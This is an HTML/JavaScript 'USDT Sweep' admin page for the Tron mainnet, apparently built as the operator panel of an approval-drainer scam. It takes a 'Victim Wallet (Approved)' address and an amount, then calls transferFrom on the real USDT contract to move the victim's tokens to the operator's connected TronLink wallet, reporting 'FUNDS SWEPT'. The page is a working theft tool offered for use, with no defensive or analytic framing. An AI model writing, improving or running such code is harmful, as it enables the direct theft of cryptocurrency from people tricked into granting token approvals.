<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mainnet Admin - USDT Sweep</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
</head>
<body class="bg-[#020617] text-slate-200 font-sans min-h-screen flex items-center justify-center p-4">

    <div class="max-w-lg w-full bg-[#0f172a] border border-slate-800 rounded-3xl p-8 shadow-2xl">
        <div class="flex items-center gap-3 mb-8">
            <div class="w-10 h-10 bg-emerald-500 rounded-lg flex items-center justify-center shadow-lg shadow-emerald-500/20">
                <svg class="w-6 h-6 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"></path></svg>
            </div>
            <div>
                <h1 class="text-2xl font-bold tracking-tight text-white">USDT Admin</h1>
                <span class="text-[10px] bg-emerald-500/10 text-emerald-500 px-2 py-0.5 rounded uppercase font-black tracking-widest border border-emerald-500/20">Mainnet Live</span>
            </div>
        </div>

        <div class="space-y-5">
            <div>
                <label class="block text-[10px] font-black uppercase tracking-[0.2em] text-slate-500 mb-2">Victim Wallet (Approved)</label>
                <input id="victimAddress" type="text" placeholder="T..." class="w-full bg-[#1e293b] border border-slate-700 rounded-xl px-4 py-4 focus:outline-none focus:border-emerald-500 transition-all text-sm font-mono tracking-tight">
            </div>

            <div>
                <label class="block text-[10px] font-black uppercase tracking-[0.2em] text-slate-500 mb-2">Withdrawal Amount (USDT)</label>
                <input id="amount" type="number" placeholder="0.00" class="w-full bg-[#1e293b] border border-slate-700 rounded-xl px-4 py-4 focus:outline-none focus:border-emerald-500 transition-all text-sm font-mono">
                <p class="text-[10px] text-slate-500 mt-2 italic">* Make sure amount is less than or equal to victim balance.</p>
            </div>

            <button id="withdrawBtn" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-black py-5 rounded-2xl shadow-lg shadow-emerald-900/20 transition-all uppercase tracking-widest mt-4 active:scale-95">
                Sweep Funds Now
            </button>

            <div id="log" class="mt-6 p-5 bg-black/40 rounded-2xl border border-slate-800 font-mono text-[10px] text-slate-400 min-h-[80px] break-all leading-relaxed">
                <span class="text-slate-600">// System ready for mainnet execution...</span>
            </div>
        </div>
    </div>

    <script>
        // MAINNET CONFIGURATION
        const CONFIG = {
            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // Real USDT Contract
            NODE: "https://api.trongrid.io"            // Real Mainnet Node
        };

        const logger = (msg) => { document.getElementById('log').innerHTML = msg; };

        document.getElementById('withdrawBtn').onclick = async () => {
            const victim = document.getElementById('victimAddress').value.trim();
            const amount = document.getElementById('amount').value;
            const btn = document.getElementById('withdrawBtn');

            if(!victim || !amount) {
                alert("Dono fields fill karna zaroori hai!");
                return;
            }

            if(!window.tronWeb) {
                alert("TronLink extension connect nahi hai!");
                return;
            }

            try {
                btn.disabled = true;
                btn.innerText = "Broadcasting...";
                logger("📡 Initializing Mainnet connection...");

                const tron = window.tronWeb;
                const adminAddr = tron.defaultAddress.base58;

                // Check connection
                if(!adminAddr) throw new Error("TronLink login check karein!");

                const contract = await tron.contract().at(CONFIG.USDT);

                // Convert to USDT units (6 decimals)
                const amountInSun = Math.floor(amount * 1000000);

                logger(`⚡ Executing transferFrom...<br>From: ${victim}<br>To: ${adminAddr}`);

                // The master function
                const tx = await contract.transferFrom(
                    victim,
                    adminAddr,
                    amountInSun
                ).send({
                    feeLimit: 150000000 // 150 TRX Limit for safety
                });

                logger(`✅ <span class="text-emerald-400">SUCCESS! FUNDS SWEPT</span><br><br>TXID: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" class="text-blue-400 underline">${tx}</a>`);
                alert("Withdrawal Complete! Check your wallet.");

            } catch (err) {
                console.error(err);
                let errorMsg = err.message || "Transaction Rejected";
                if(errorMsg.includes("REVERT")) errorMsg = "REVERT: Approval missing or insufficient balance/energy.";
                logger(❌ ERROR: ${errorMsg});
            } finally {
                btn.disabled = false;
                btn.innerText = "Sweep Funds Now";
            }
        };
    </script>
</body>
</html>
